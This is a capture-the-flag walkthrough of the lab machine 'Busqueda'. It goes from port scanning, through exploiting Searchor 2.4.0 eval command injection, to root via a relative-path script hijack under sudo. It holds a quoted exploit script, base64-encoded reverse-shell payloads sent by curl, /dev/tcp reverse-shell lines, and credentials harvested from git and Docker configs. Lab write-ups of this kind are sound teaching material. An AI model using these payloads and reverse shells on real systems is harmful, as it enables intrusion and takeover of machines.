# Busqueda
## OS: Linux
## Difficulty: Easy

## Enumeration:

I'll start with a port scan:
```bash
nmap -sC -sV -p- -oA nmap/ 10.129.228.217
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see 2 ports opened. I'll "searcher.htb" to my hosts file and examine the web server on port 80.

![page](IMG/img1.png)

This looks like some sort of search engine.

I'll open up BurpSuite and see if there is any command injection vulnerability.

![req1](IMG/img2.png)

It does not seem like it is but I found out what's being used for the search.

```
</a> and <a  style="color:black" target='_blank' href="https://github.com/ArjunSharda/Searchor">Searchor 2.4.0</a>
```

Looking at the Github repo we can find a vulnerability, "Arbitrary Code using Eval in Searchor CLI's Search
".

## Foothold:

I also found a POC for this exploit.

[POC Arbitrary Code using Eval in Searchor CLI's Search](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

```bash
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
```

It's a command injection. I'll use bash and curl to replicate the POC.

First let's build the reverse shell payload:

```bash
port="6666"
adr="10.10.14.63"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$adr/$port 0>&1'" | base64)
payload_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # idk id"

plus="+"
if [ -z "${payload_cmd##*$plus*}" ]
then
    payload_cmd=$(echo ${payload_cmd} | sed -r 's/[+]+/%2B/g')
fi

echo $payload_cmd
```

```payload
',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjMvNjY2NiAwPiYxJw==|base64 -d|bash -i')) # idk id
```

Now let's send it:
```bash
curl -s -X POST http://searcher.htb/search -d "engine=Google&query=',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjMvNjY2NiAwPiYxJw==|base64 -d|bash -i')) # idk id"
```

And we got a hit.

![revShell](IMG/img3.png)

Now we can get the user flag.

```bash
cat ~/user.txt
```
## We got the user flag!

## Privilege Escalation:

I'll first establish a more stable connection via ssh.

Found an interesting file:

```bash
cat .gitconfig 
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

I've gone back to the web app directory and found a password for this account:
```bash
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

```

We can use it to list binaries we can run as root.

```bash
sudo -l 
jh1usoih2bkjaspwe92

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Let's see what that script does.
```bash
cat /opt/scripts/system-checkup.py

cat: /opt/scripts/system-checkup.py: Permission denied
```

Bummer. Maybe running it will give us more information.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py .
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   20 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   20 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

I'll enumerate these services.

### Git tea

I'll start by inspecting the container's config file.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{json\ .Config}} 960873171e2e


{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}

```

We can see a password for the git tea database in the config file.

```
GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
``

I'll add gitea.searcher.htb to my hosts file.

With the credentials we have we can login as the administrator.

```bash
administrator : yuiu1hoiu4i5ho1uh
```


Inspecting the system-checkup.py I found something that can be used for privilege escalation.

```python
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```


We can see that the relative path for "full-checkup.sh" is being used.


We can make a reverse shell script with that name in the ~ directory. After running the command we should have a connection as the root user.

Script:
```bash
#!/bin/bash

bash  -c 'bash -i >& /dev/tcp/10.10.14.63/6666 0>&1'
```

I'll open a listening port and run the command:

```bash 
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Note make sure to use chmod +x to add the executable flag to the script.

And it worked!

![root](IMG/img5.png)

We are now the root user. Let's get the flag.

```bash
cat /root/root.txt
```

## We got the root flag!
